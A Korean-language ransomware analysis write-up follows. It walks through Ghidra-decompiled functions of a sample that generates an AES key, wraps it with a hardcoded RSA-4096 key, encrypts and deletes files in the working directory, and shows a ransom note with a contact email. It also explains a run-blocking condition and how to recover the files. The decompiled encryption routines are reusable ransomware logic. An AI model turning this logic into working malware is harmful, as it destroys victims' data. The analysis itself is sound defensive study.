
### 정적 분석 (Ghidra 사용)
Ghidra에서 Ransomware.exe를 달았을 때 바로 보이는 FUN_140001ec4 함수가 랜섬웨어를 동작시키는 함수라고 생각했다. 
![[image 11.png]]
그 함수로 들어가서 `FUN`이 붙은 함수들을 마구잡이로 들어가 분석해 보니 `FUN_140001930` 함수가 가장 살펴볼 것이 많은 함수라 생각되어 그 함수로 들어가 분석해 보았다. 
![[Pasted image 20250713014858.png]]
#### FUN_140001930 함수 분석
- 코드
    ```c
    void FUN_140001930(void)
    {
      char cVar1;
      code *pcVar2;
      int iVar3;
      NTSTATUS NVar4;
      PUCHAR pbBuffer;
      char *_Memory;
      char *pcVar5;
      char *pcVar6;
      FILE *_File;
      undefined *puVar7;
      uint uVar8;
      uint uVar9;
      uint uVar10;
      ULONG *pUVar11;
      undefined8 uVar12;
      ulonglong uVar13;
      undefined1 auStack_58 [32];
      BCRYPT_ALG_HANDLE local_38;
      ULONG local_30 [2];
      ulonglong local_28;
      
      local_28 = DAT_140005000 ^ (ulonglong)auStack_58;
      pbBuffer = (PUCHAR)calloc(0x20,1);
      if (pbBuffer != (PUCHAR)0x0) {
        uVar12 = 0;
        NVar4 = BCryptOpenAlgorithmProvider(&local_38,L"RNG",(LPCWSTR)0x0,0);
        if (-1 < NVar4) {
          uVar12 = 0;
          BCryptGenRandom(local_38,pbBuffer,0x20,0);
          BCryptCloseAlgorithmProvider(local_38,0);
        }
        uVar10 = 0;
        pUVar11 = local_30;
        local_38 = (BCRYPT_ALG_HANDLE)0x0;
        uVar9 = 0;
        local_30[0] = 0;
        FUN_140001bd0(pbBuffer,&local_38,pUVar11);
        _Memory = (char *)malloc(0x64000);
        if (_Memory != (char *)0x0) {
          local_38 = (BCRYPT_ALG_HANDLE)((ulonglong)local_38 & 0xffffffff00000000);
          FUN_140001320((longlong)_Memory,(int *)&local_38,pUVar11,uVar12);
          iVar3 = (int)local_38;
          uVar13 = (ulonglong)local_38 & 0xffffffff;
          uVar8 = uVar10;
          if (0 < (int)local_38) {
            do {
              puVar7 = &DAT_140003ab4;
              pcVar5 = strstr(_Memory + (longlong)(int)uVar8 * 0x1000,".key");
              if (pcVar5 != (char *)0x0) {
                free(_Memory);
                system("mode con: cols=120 lines=30");
                system("color 0C");
                FUN_140001200(&DAT_1400039e4,puVar7,pUVar11,uVar12);
                FUN_140001200("***************************************\\n",puVar7,pUVar11,uVar12);
                FUN_140001200("*           !! WARNING !!             *\\n",puVar7,pUVar11,uVar12);
                FUN_140001200("***************************************\\n",puVar7,pUVar11,uVar12);
                FUN_140001200("        You Already Infected!         \\n",puVar7,pUVar11,uVar12);
                FUN_140001200("***************************************\\n",puVar7,pUVar11,uVar12);
                FUN_140001200("Contact us at: faswinterhard3@email.com\\n",puVar7,pUVar11,uVar12);
                FUN_140001200("***************************************\\n",puVar7,pUVar11,uVar12);
                do {
                  Sleep(1000);
                } while( true );
              }
              uVar8 = uVar8 + 1;
            } while ((int)uVar8 < iVar3);
          }
          pcVar5 = _Memory;
          uVar8 = uVar10;
          if (0 < iVar3) {
            do {
              if ((*pcVar5 != '.') ||
                 ((pcVar5[1] != '\\0' &&
                  (((*pcVar5 != '.' || (pcVar5[1] != '.')) || (pcVar5[2] != '\\0')))))) {
                pcVar6 = pcVar5;
                do {
                  cVar1 = *pcVar6;
                  (_Memory + ((longlong)(int)uVar8 * 0x1000 - (longlong)pcVar5))[(longlong)pcVar6] =
                       cVar1;
                  pcVar6 = pcVar6 + 1;
                } while (cVar1 != '\\0');
                uVar8 = uVar8 + 1;
              }
              // ransomware.exe 파일을 찾아 존재하면 제거 -> 중복 실행 방지
              pcVar6 = strstr(pcVar5,"ransomware.exe");
              uVar9 = uVar8 - 1;
              if (pcVar6 == (char *)0x0) {
                uVar9 = uVar8;
              }
              uVar13 = uVar13 - 1;
              pcVar5 = pcVar5 + 0x1000;
              uVar8 = uVar9;
            } while (uVar13 != 0);
          }
          if (0 < (int)uVar9) {
            do {
              _File = fopen(_Memory + (longlong)(int)uVar10 * 0x1000,"rb");
              if (_File == (FILE *)0x0) {
                free(_Memory);
                goto LAB_140001ba0;
              }
              fclose(_File);
              uVar10 = uVar10 + 1;
            } while ((int)uVar10 < (int)uVar9);
          }
          uVar13 = (ulonglong)uVar9;
          FUN_140001740(_Memory,uVar9,pbBuffer);
          FUN_140001420(_Memory,uVar13,pbBuffer,uVar12);
          pcVar2 = (code *)swi(3);
          (*pcVar2)();
          return;
        }
      }
    LAB_140001ba0:
      FUN_140001dc0(local_28 ^ (ulonglong)auStack_58);
      return;
    }
    
    ///////////////////////////////////////////////////////////
    void FUN_140001dc0(longlong param_1)
    
    {
      if ((param_1 == DAT_140005000) && ((short)((ulonglong)param_1 >> 0x30) == 0)) {
        return;
      }
      FUN_140002088();
      return;
    }
    ```

`FUN_140001930` 함수에 들어가자마자 pbBuffer를 0x20만큼 동적 할당해서 그 공간에 CNG로 RNG를 실행시켜 32byte 난수를 저장하는 것을 확인할 수 있었음

스크롤을 조금 더 내려서 확인해 보니 `FUN_140001bd0`함수와 `FUN_140001320` 함수, 랜섬노트를 출력하는 코드, `FUN_140001740, FUN_140001420` 함수들이 주목할 만한 코드들인 것을 확인함

→ FUN_140001200: 화면 상에 텍스트를 표시하는 함수
→ FUN_140001420: 랜섬노트만을 나타내는 함수
![[Pasted image 20250713014547.png]]
`FUN_140001dc0` 함수: XOR의 원리에 의해 C언어의 return; 에 해당하는 함수

#### `FUN_140001bd0` 함수 분석
- 코드
    ```c
    void FUN_140001bd0(PUCHAR param_1,undefined8 *param_2,ULONG *param_3)
    {
      undefined4 uVar1;
      undefined4 uVar2;
      undefined4 uVar3;
      undefined4 uVar4;
      undefined4 uVar5;
      undefined4 uVar6;
      undefined4 uVar7;
      undefined4 uVar8;
      undefined8 uVar9;
      undefined8 uVar10;
      undefined8 uVar11;
      undefined8 uVar12;
      NTSTATUS NVar13; // status로 변수명 변경
      PUCHAR pbInput; // PublicKey_BLOB으로 변수명 변경
      PUCHAR pUVar14; // Cipher로 변수명 변경
      undefined8 *puVar15;
      longlong lVar16;
      undefined1 auStackY_88 [32];
      BCRYPT_KEY_HANDLE local_38; // RSA_KeyHandle로 변수명 변경
      ulonglong local_30;
      
      local_30 = DAT_140005000 ^ (ulonglong)auStackY_88;
      local_38 = (BCRYPT_KEY_HANDLE)0x0;
      pbInput = (PUCHAR)calloc(1,0x21c);
      if (pbInput != (PUCHAR)0x0) {
        lVar16 = 4;
        *(undefined2 *)(pbInput + 0x18) = DAT_140005280;
        pbInput[0x1a] = DAT_140005282;
        pbInput[0] = 'R';
        pbInput[1] = 'S';
        pbInput[2] = 'A';
        pbInput[3] = '1';
        pbInput[4] = '\\0';
        pbInput[5] = '\\x10';
        pbInput[6] = '\\0';
        pbInput[7] = '\\0';
        pbInput[8] = '\\x03';
        pbInput[9] = '\\0';
        pbInput[10] = '\\0';
        pbInput[0xb] = '\\0';
        pbInput[0xc] = '\\0';
        pbInput[0xd] = '\\x02';
        pbInput[0xe] = '\\0';
        pbInput[0xf] = '\\0';
        pbInput[0x10] = '\\0';
        pbInput[0x11] = '\\0';
        pbInput[0x12] = '\\0';
        pbInput[0x13] = '\\0';
        pbInput[0x14] = '\\0';
        pbInput[0x15] = '\\0';
        pbInput[0x16] = '\\0';
        pbInput[0x17] = '\\0';
        pUVar14 = pbInput + 0x1b;
        puVar15 = (undefined8 *)&DAT_140005080;
        do {
          uVar9 = puVar15[1];
          uVar10 = puVar15[2];
          uVar11 = puVar15[3];
          *(undefined8 *)pUVar14 = *puVar15;
          *(undefined8 *)(pUVar14 + 8) = uVar9;
          uVar9 = puVar15[4];
          uVar12 = puVar15[5];
          *(undefined8 *)(pUVar14 + 0x10) = uVar10;
          *(undefined8 *)(pUVar14 + 0x18) = uVar11;
          uVar10 = puVar15[6];
          uVar11 = puVar15[7];
          *(undefined8 *)(pUVar14 + 0x20) = uVar9;
          *(undefined8 *)(pUVar14 + 0x28) = uVar12;
          uVar9 = puVar15[8];
          uVar12 = puVar15[9];
          *(undefined8 *)(pUVar14 + 0x30) = uVar10;
          *(undefined8 *)(pUVar14 + 0x38) = uVar11;
          uVar10 = puVar15[10];
          uVar11 = puVar15[0xb];
          *(undefined8 *)(pUVar14 + 0x40) = uVar9;
          *(undefined8 *)(pUVar14 + 0x48) = uVar12;
          uVar1 = *(undefined4 *)(puVar15 + 0xc);
          uVar2 = *(undefined4 *)((longlong)puVar15 + 100);
          uVar3 = *(undefined4 *)(puVar15 + 0xd);
          uVar4 = *(undefined4 *)((longlong)puVar15 + 0x6c);
          *(undefined8 *)(pUVar14 + 0x50) = uVar10;
          *(undefined8 *)(pUVar14 + 0x58) = uVar11;
          uVar5 = *(undefined4 *)(puVar15 + 0xe);
          uVar6 = *(undefined4 *)((longlong)puVar15 + 0x74);
          uVar7 = *(undefined4 *)(puVar15 + 0xf);
          uVar8 = *(undefined4 *)((longlong)puVar15 + 0x7c);
          *(undefined4 *)(pUVar14 + 0x60) = uVar1;
          *(undefined4 *)(pUVar14 + 100) = uVar2;
          *(undefined4 *)(pUVar14 + 0x68) = uVar3;
          *(undefined4 *)(pUVar14 + 0x6c) = uVar4;
          *(undefined4 *)(pUVar14 + 0x70) = uVar5;
          *(undefined4 *)(pUVar14 + 0x74) = uVar6;
          *(undefined4 *)(pUVar14 + 0x78) = uVar7;
          *(undefined4 *)(pUVar14 + 0x7c) = uVar8;
          lVar16 = lVar16 + -1;
          pUVar14 = pUVar14 + 0x80;
          puVar15 = puVar15 + 0x10;
        } while (lVar16 != 0);
        NVar13 = BCryptImportKeyPair((BCRYPT_ALG_HANDLE)0xe1,(BCRYPT_KEY_HANDLE)0x0,L"RSAPUBLICBLOB",
                                     &local_38,pbInput,0x21b,8);
        if (-1 < NVar13) {
          NVar13 = BCryptEncrypt(local_38,param_1,0x20,(void *)0x0,(PUCHAR)0x0,0,(PUCHAR)0x0,0,param_3,2
                                );
          if (-1 < NVar13) {
            pUVar14 = (PUCHAR)calloc((ulonglong)*param_3,1);
            *param_2 = pUVar14;
            if (pUVar14 != (PUCHAR)0x0) {
              NVar13 = BCryptEncrypt(local_38,param_1,0x20,(void *)0x0,(PUCHAR)0x0,0,pUVar14,*param_3,
                                     param_3,2);
              if (-1 < NVar13) {
                BCryptDestroyKey(local_38);
                BCryptCloseAlgorithmProvider((BCRYPT_ALG_HANDLE)0xe1,0);
                free(pbInput);
              }
            }
          }
        }
      }
      FUN_140001dc0(local_30 ^ (ulonglong)auStackY_88);
      return;
    }
    ```    

매개변수로 받는 것: RNG로 생성된 32byte 난수, 알고리즘 핸들, 배열

**전반적인 함수 진행**
1. RSA4096 키 핸들 설정
2. RSA PublicKeyBLOB 동적할당, 이후 코드들은 이 동적 할당이 제대로 이루어졌다는 가정 하에서 동작
3. RSA PublicKeyBLOB 구조체의 여러 멤버변수 설정
4. 첫 번째 매개변수로 받은 32byte의 평문(AES 암호화의 키로 추정됨)을 RSA4096으로 암호화, 암호문을 두 번째 매개변수에 포인터로 연결하여 상위 함수에서 참조 가능하게 함
5. 세 번째 매개변수: RSA4096으로 암호화된 암호문의 길이에 해당
#### `FUN_140001320` 함수 분석
- 코드
    ```c
    /* WARNING: Function: __chkstk replaced with injection: alloca_probe */
    
    void FUN_140001320(longlong param_1,int *param_2,undefined8 param_3,undefined8 param_4)
    {
      char cVar1;
      BOOL BVar2;
      char *pcVar3;
      HANDLE hFindFile;
      CHAR *pCVar4;
      undefined1 auStack_2178 [32];
      _WIN32_FIND_DATAA local_2158; // FindData로 변수명 변경하면 편함
      char local_2018 [4096]; // fileName과 동일
      CHAR local_1018 [4096]; // filePath와 동일
      ulonglong local_18;
      undefined8 uStack_10;
      
      uStack_10 = 0x140001330;
      local_18 = DAT_140005000 ^ (ulonglong)auStack_2178;
      pcVar3 = _getcwd(local_2018,0x1000);
      if (pcVar3 != (char *)0x0) {
        FUN_140001260(local_1018,&DAT_1400039b0,local_2018,param_4);
        hFindFile = FindFirstFileA(local_1018,&local_2158);
        if (hFindFile != (HANDLE)0xffffffffffffffff) {
          do {
            pCVar4 = local_2158.cFileName;
            pcVar3 = (char *)((longlong)*param_2 * 0x1000 + param_1);
            do {
              cVar1 = *pCVar4;
              pCVar4 = pCVar4 + 1;
              *pcVar3 = cVar1;
              pcVar3 = pcVar3 + 1;
            } while (cVar1 != '\\0');
            *param_2 = *param_2 + 1;
            BVar2 = FindNextFileA(hFindFile,&local_2158);
          } while ((BVar2 != 0) && (*param_2 < 100));
          FindClose(hFindFile);
        }
      }
      FUN_140001dc0(local_18 ^ (ulonglong)auStack_2178);
      return;
    }
    
    //////////////////////////////////////////////////////////
    int FUN_140001260(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)
    
    {
      int iVar1;
      ulonglong *puVar2;
      undefined8 local_res18;
      undefined8 local_res20;
      
      local_res18 = param_3;
      local_res20 = param_4;
      puVar2 = (ulonglong *)FUN_1400011f0();
      iVar1 = __stdio_common_vsprintf(*puVar2 | 1,param_1,0xffffffffffffffff,param_2,0,&local_res18);
      if (iVar1 < 0) {
        iVar1 = -1;
      }
      return iVar1;
    }
    ```

매개변수로 받는 것: 0x64000만큼 동적 할당 받은 메모리, local_38 변수, `FUN_140001bd0`함수에서 계산한 RSA4096 암호문의 크기, 0

**전반적인 함수 진행**
1. _getcwd 함수로 현재 작업 디렉터리 가져오기
2. 해당 경로에서 파일 탐색 시작
3. 바깥쪽 do-while 문을 돌리며 파일이 존재하지 않거나 100개 이상이 될 때까지 파일 탐색

`FUN_140001260`함수: sprint 함수와 동일
#### `FUN_140001740` 함수 분석
- 코드
    ```c
    void FUN_140001740(void *param_1,int param_2,PUCHAR param_3)
    {
      long lVar1; // ftell로 반환된 값으로, 파일의 전체 바이트 수를 담음 -> ByteOfFile로 변수명 변경
      FILE *pFVar2; // fopen에서 사용하는 포인터로, fp로 변경해도 무방
      undefined1 *puVar3;
      size_t sVar4;
      undefined1 *_Str;
      char *_Filename;
      size_t sVar5; // 파일 하나의 사이즈를 받아 local_48에 전달, fileSize로 변수명 변경
      uint uVar6;
      ulonglong uVar7;
      undefined1 *local_res20; // sVar5만큼 동적 할당받은 배열의 포인터가 들어가는 곳으로, Plain으로 변수명 변경
      size_t local_48 [2]; // PlainLength로 변수명 변경
      
      uVar7 = 0;
      if (0 < param_2) {
        do {
          _Filename = (char *)(uVar7 * 0x1000 + (longlong)param_1);
          if ((int)uVar7 == 0) {
            FUN_1400014b0(_Filename,param_3);
          }
          else {
            pFVar2 = fopen(_Filename,"rb");
            if (pFVar2 != (FILE *)0x0) {
              fseek(pFVar2,0,2);
              lVar1 = ftell(pFVar2);
              sVar5 = (size_t)lVar1;
              local_48[0] = sVar5;
              rewind(pFVar2);
              puVar3 = (undefined1 *)calloc(sVar5,1);
              local_res20 = puVar3;
              if (puVar3 == (undefined1 *)0x0) {
                fclose(pFVar2);
              }
              else {
                sVar4 = fread(puVar3,1,sVar5,pFVar2);
                if (sVar4 == sVar5) {
                  fclose(pFVar2);
                  FUN_140001000(&local_res20,local_48,param_3);
                  sVar5 = local_48[0];
                  _Str = (undefined1 *)calloc(local_48[0] + 4,1);
                  puVar3 = local_res20;
                  if (_Str != (undefined1 *)0x0) {
                    _Str[3] = (char)lVar1;
                    *_Str = (char)((uint)lVar1 >> 0x18);
                    _Str[1] = (char)((uint)lVar1 >> 0x10);
                    _Str[2] = (char)((uint)lVar1 >> 8);
                    memcpy(_Str + 4,local_res20,sVar5);
                    pFVar2 = fopen(_Filename,"wb");
                    puVar3 = _Str;
                    if (pFVar2 != (FILE *)0x0) {
                      fwrite(_Str,1,sVar5 + 4,pFVar2);
                      fclose(pFVar2);
                    }
                  }
                  free(puVar3);
                }
                else {
                  free(puVar3);
                  fclose(pFVar2);
                }
              }
            }
          }
          uVar6 = (int)uVar7 + 1;
          uVar7 = (ulonglong)uVar6;
        } while ((int)uVar6 < param_2);
      }
                        /* WARNING: Could not recover jumptable at 0x000140001920. Too many branches */
                        /* WARNING: Treating indirect jump as call */
      free(param_1);
      return;
    }
    ```

매개변수로 받는 것

param_1: 상위 함수인 `FUN_140001930`과 `FUN_140001320`함수에서 사용한 메모리로, 파일 이름의 정보가 들어 있음
param_2: while 반복문의 횟수 카운트에 사용하는 변수
param_3: `FUN_140001930`에서 RNG를 통해 생성된 AES 암호화의 32byte 키

**전반적인 함수 진행**: 매개변수를 받아 uVar6, uVar7 변수를 1 증가 시키며 다음 절차를 실행
1. 파일 목록을 받아 uVar변수가 0이면, 즉 첫 번째 파일이면 `FUN_1400014b0`함수를 실행
2. 아니라면 fseek, ftell로 현재 파일의 크기를 재어 그 바이트 수를 변수에 저장, 이후 rewind 함수로 다시 파일 포인터를 처음으로 이동
3. 해당 바이트 수만큼 배열을 동적 할당하여 그 주소를 local_res20 변수에 저장, 일단 파일을 닫고 fread로 그 수만큼 파일을 읽어 정상적으로 읽어졌다면 `FUN_140001000`함수를 실행
4. `FUN_140001000`함수의 실행이 끝나면 local_48 + 4만큼 _Str 배열을 동적 할당하여 그 공간에는 _파일의 전체 바이트 수 >> 0x18, >> 0x10, >>0x08, 파일의 전체 바이트 수, 암호문_의 순서대로 대입
5. 다시 파일을 이진 쓰기 모드로 열어 Str 배열을 파일 크기 + 4만큼 기록
##### `FUN_1400014b0` 함수 분석
- 코드
    ```c
    /* WARNING: Function: __chkstk replaced with injection: alloca_probe */
    
    void FUN_1400014b0(char *param_1,PUCHAR param_2)
    {
      undefined8 uVar1;
      undefined8 uVar2;
      undefined8 uVar3;
      undefined8 uVar4;
      long lVar5; // fseek, ftell에서 파일의 전체 바이트 수를 나타냄, ByteOfFile로 변수명 변경
      FILE *pFVar6; // fopen, fclose 등에 사용, fp로 변수명 변경
      void *_DstBuf;
      undefined8 *puVar7;
      PUCHAR _Str;
      PUCHAR pUVar8;
      longlong lVar9;
      undefined8 *puVar10;
      undefined1 auStack_1078 [32];
      undefined8 *local_1058;
      void *local_1050;
      ULONG local_1048 [4];
      char local_1038 [4096]; // 확장자가 바뀐 새로운 파일로, newFileName으로 변수명 변경
      ulonglong local_38;
      
      local_38 = DAT_140005000 ^ (ulonglong)auStack_1078;
      pFVar6 = fopen(param_1,"rb");
      if (pFVar6 != (FILE *)0x0) {
        fseek(pFVar6,0,2);
        lVar5 = ftell(pFVar6);
        puVar10 = (undefined8 *)(longlong)lVar5;
        local_1058 = puVar10;
        rewind(pFVar6);
        _DstBuf = calloc((size_t)puVar10,1);
        local_1050 = _DstBuf;
        if (_DstBuf != (void *)0x0) {
          puVar7 = (undefined8 *)fread(_DstBuf,1,(size_t)puVar10,pFVar6);
          if (puVar7 == puVar10) {
            fclose(pFVar6);
            FUN_140001000(&local_1050,(ulonglong *)&local_1058,param_2);
            puVar10 = local_1058;
            _Str = (PUCHAR)calloc((longlong)local_1058 + 0x204,1);
            if (_Str == (PUCHAR)0x0) {
              free(local_1050);
              _Str = param_2;
            }
            else {
              _Str[3] = (UCHAR)lVar5;
              *_Str = (UCHAR)((uint)lVar5 >> 0x18);
              _Str[1] = (UCHAR)((uint)lVar5 >> 0x10);
              _Str[2] = (UCHAR)((uint)lVar5 >> 8);
              local_1058 = (undefined8 *)calloc(0x200,1);
              local_1048[0] = 0;
              FUN_140001bd0(param_2,&local_1058,local_1048);
              if (local_1058 == (undefined8 *)0x0) {
                free(local_1050);
              }
              else {
                lVar9 = 4;
                pUVar8 = _Str + 4;
                puVar7 = local_1058;
                do {
                  uVar1 = puVar7[1];
                  uVar2 = puVar7[2];
                  uVar3 = puVar7[3];
                  *(undefined8 *)pUVar8 = *puVar7;
                  *(undefined8 *)(pUVar8 + 8) = uVar1;
                  uVar1 = puVar7[4];
                  uVar4 = puVar7[5];
                  *(undefined8 *)(pUVar8 + 0x10) = uVar2;
                  *(undefined8 *)(pUVar8 + 0x18) = uVar3;
                  uVar2 = puVar7[6];
                  uVar3 = puVar7[7];
                  *(undefined8 *)(pUVar8 + 0x20) = uVar1;
                  *(undefined8 *)(pUVar8 + 0x28) = uVar4;
                  uVar1 = puVar7[8];
                  uVar4 = puVar7[9];
                  *(undefined8 *)(pUVar8 + 0x30) = uVar2;
                  *(undefined8 *)(pUVar8 + 0x38) = uVar3;
                  uVar2 = puVar7[10];
                  uVar3 = puVar7[0xb];
                  *(undefined8 *)(pUVar8 + 0x40) = uVar1;
                  *(undefined8 *)(pUVar8 + 0x48) = uVar4;
                  uVar1 = puVar7[0xc];
                  uVar4 = puVar7[0xd];
                  *(undefined8 *)(pUVar8 + 0x50) = uVar2;
                  *(undefined8 *)(pUVar8 + 0x58) = uVar3;
                  uVar2 = puVar7[0xe];
                  uVar3 = puVar7[0xf];
                  *(undefined8 *)(pUVar8 + 0x60) = uVar1;
                  *(undefined8 *)(pUVar8 + 0x68) = uVar4;
                  *(undefined8 *)(pUVar8 + 0x70) = uVar2;
                  *(undefined8 *)(pUVar8 + 0x78) = uVar3;
                  lVar9 = lVar9 + -1;
                  pUVar8 = pUVar8 + 0x80;
                  puVar7 = puVar7 + 0x10;
                } while (lVar9 != 0);
                memcpy(_Str + 0x204,local_1050,(size_t)puVar10);
                FUN_1400012c0(local_1038,0x1000,"%s.key",param_1);
                pFVar6 = fopen(local_1038,"wb");
                if (pFVar6 != (FILE *)0x0) {
                  remove(param_1);
                  fwrite(_Str,1,(longlong)puVar10 + 0x204,pFVar6);
                  fclose(pFVar6);
                }
              }
            }
            free(_Str);
            goto LAB_140001722;
          }
          free(_DstBuf);
        }
        fclose(pFVar6);
      }
    LAB_140001722:
      FUN_140001dc0(local_38 ^ (ulonglong)auStack_1078);
      return;
    }
    ```
    
매개변수로 받는 것: 상위 함수인 `FUN_140001740`함수에서 받은 파일명, AES의 암호화 키

**전반적인 함수 진행**
1. 주어진 파일을 이진 읽기 모드로 열고, fseek함수와 ftell 함수로 파일의 바이트 수를 세어 local_1058 변수에 저장
2. 그만큼 0으로 된 배열을 동적으로 local_1050에 할당하여 AES256/CBC/PKCS7Padding으로 암호화
3. AES암호문(local_1050)의 길이(local_1058) + 0x204만큼 _Str에 배열을 동적으로 할당, _Str에서 4만큼의 여유 공간에는 _파일의 전체 바이트 수 >> 0x18, >>0x10, >>0x08, 파일의 전체 바이트 수_를 순서대로 대입
4. 0x200만큼 배열을 동적으로 local_1058에 할당, RSA4096 암호화 함수에 순서대로 AES의 키, local_1058의 주소, 0을 넣고 암호화
5. RSA 암호문(local_1050)을 _Str+0x204에 복사
6. `FUN_1400012c0(sprintf)`함수에서는 (파일명).key로 새로운 확장자를 설정
7. 원본 파일 삭제, Str 배열을 그 새로운 파일에 이진 쓰기 모드로 열어 작성
##### `FUN_140001000` 함수 분석
- 코드
    ```c
    void FUN_140001000(undefined8 *param_1,ulonglong *param_2,PUCHAR param_3)
    {
      NTSTATUS NVar1; // status
      PUCHAR pbOutput; // Cipher
      undefined1 auStackY_b8 [32];
      ULONG local_68 [2]; // CipherLength
      BCRYPT_KEY_HANDLE local_60; // KEY_HANDLE
      BCRYPT_ALG_HANDLE local_58; // algHandle
      ULONG local_50 [2]; // IVLength
      UCHAR local_48 [16]; // IV
      ulonglong local_38;
      
      local_38 = DAT_140005000 ^ (ulonglong)auStackY_b8;
      local_58 = (BCRYPT_ALG_HANDLE)0x0;
      local_50[0] = 0;
      local_50[1] = 0;
      local_68[0] = 0;
      local_48[0] = '\\0';
      local_48[1] = '\\0';
      local_48[2] = '\\0';
      local_48[3] = '\\0';
      local_48[4] = '\\0';
      local_48[5] = '\\0';
      local_48[6] = '\\0';
      local_48[7] = '\\0';
      local_48[8] = '\\0';
      local_48[9] = '\\0';
      local_48[10] = '\\0';
      local_48[0xb] = '\\0';
      local_48[0xc] = '\\0';
      local_48[0xd] = '\\0';
      local_48[0xe] = '\\0';
      local_48[0xf] = '\\0';
      NVar1 = BCryptOpenAlgorithmProvider(&local_58,L"AES",(LPCWSTR)0x0,0);
      if (-1 < NVar1) {
        local_60 = (BCRYPT_HANDLE)0x0;
        NVar1 = BCryptGenerateSymmetricKey(local_58,&local_60,(PUCHAR)0x0,0,param_3,0x20,0);
        if ((((-1 < NVar1) &&
             (NVar1 = BCryptSetProperty(local_60,L"ChainingMode",(PUCHAR)L"ChainingModeCBC",0x20,0),
             -1 < NVar1)) &&
            (NVar1 = BCryptGetProperty(local_60,L"BlockLength",(PUCHAR)local_50,4,local_50 + 1,0),
            -1 < NVar1)) &&
           (((NVar1 = BCryptEncrypt(local_60,(PUCHAR)*param_1,8,(void *)0x0,local_48,local_50[0],
                                    (PUCHAR)0x0,0,local_68,1), -1 < NVar1 &&
             (pbOutput = (PUCHAR)calloc((ulonglong)local_68[0],1), pbOutput != (PUCHAR)0x0)) &&
            (NVar1 = BCryptEncrypt(local_60,(PUCHAR)*param_1,(ULONG)*param_2,(void *)0x0,local_48,
                                   local_50[0],pbOutput,local_68[0],local_50 + 1,1), -1 < NVar1)))) {
          free((void *)*param_1);
          *param_1 = pbOutput;
          *param_2 = (ulonglong)local_68[0];
          BCryptDestroyKey(local_60);
          BCryptCloseAlgorithmProvider(local_58,0);
          free(pbOutput);
        }
      }
      FUN_140001dc0(local_38 ^ (ulonglong)auStackY_b8);
      return;
    }
    
    ```

매개변수로 받는 것: 평문, 평문의 길이, AES암호화의 키

**전반적인 함수 진행**
1. 상위 함수에서 매개변수로 평문, 평문의 길이, AES의 Key 각각을 받아 키 핸들을 만듦
2. AES256/CBC/PKCS7Padding으로 암호화 진행, IV는 전부 0
3. 암호화 결과를 pbOutput에 넣고 param_1은 pbOutput, param_2는 암호문의 길이를 대입

### 랜섬웨어가 실행되지 않는 조건
![[Pasted image 20250713021233.png]]
FUN_140001930 함수에서 105~115행의 반복문에서 찾을 수 있음

107행에서 fopen() 함수를 사용해 파일 탐색 함수에서 반환한 `_Memory`의 파일 목록들을 하나씩 열어보는 과정에서 fopen() 함수는 폴더가 아닌 파일을 여는 함수이므로 찾은 파일 목록에 폴더가 하나라도 있다면 LAB_140001ba0로 들어가서 return;을 실행하게 됨

### 랜섬웨어 복호화
랜섬웨어 복호화의 경우, 해당 파일이 디렉터리의 첫 번째 파일인지, 아닌지에 따라 복호화 방식이 다르다. 
이는 랜섬웨어가 첫 번째 파일을 암호화할 경우에만 파일 확장자를 변경하기 때문이다. ![[Pasted image 20250713020229.png]]
![[Pasted image 20250713020300.png]]
* 첫 번째 파일인 경우 (즉, 확장자가 .key인 경우)
	* 이 경우는 확장자가 KEY로 변하면서 원본 데이터 앞에 부가 데이터 4바이트 + RSA로 암호화된 AES의 키 512바이트 = 516바이트가 붙기 때문에 이를 제거하고 .key 확장자도 제거해야 한다.
	* 따라서 다음과 같이 앞의 516바이트를 제거하고 확장자를 변경하여 복호화 할 수 있다. ![[Pasted image 20250713020631.png]]
	![[Pasted image 20250713020709.png]]
	
* 첫 번째 파일이 아닌 경우
	![[Pasted image 20250713020740.png]]
	* 이 경우는 위의 그림과 같이 앞의 4바이트만 지우면 간단하게 정상적으로 복호화 되는 것을 확인할 수 있다. 
	
### 랜섬웨어 구조도
![[Pasted image 20250713015835.png]]

### 추가로 찾은 데이터
RSA 암복호화에 사용되는 n: `FUN_140001bd0`함수에서 DAT_140005080과 DAT_140005280 사이의 0x200만큼의 값 → 반복문을 돌리며 해당 값을 n에 저장
